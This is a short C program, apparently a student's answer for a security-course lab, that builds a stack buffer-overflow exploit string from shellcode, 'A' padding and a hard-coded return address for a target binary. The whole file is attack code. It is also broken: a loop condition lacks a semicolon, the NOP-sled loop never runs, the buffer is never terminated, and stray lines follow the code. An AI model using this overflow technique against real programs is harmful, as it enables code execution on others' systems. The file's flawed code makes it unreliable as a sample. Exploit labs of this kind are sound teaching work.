#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

/*
 * Construct your exploit string in the main function and print it.
 * You can pass it into a target binary <target> by running"<target> $(sploit)"
 * in your terminal.
 */

int main(void)
{
  char exploit[240 + 4 + 4];
  int ret_pos = 244;
  int address = 0xffffd4cc;
  memcpy(exploit + ret_pos, &address, sizeof(address));

  int m = 0;
  for (int i = 0; i < m; i++) {
      exploit[i] = 0x90;
  }
  for (int i = m; i < m + strlen(shellcode); i++) {
      exploit[i] = shellcode[i - m];
  }

  for (int i = m + strlen(shellcode); i < ret_pos i++) {
      exploit[i] = 'A';
  }

  printf("%s", exploit);
  return 0;
}

0xffffdcc


-128 +128 
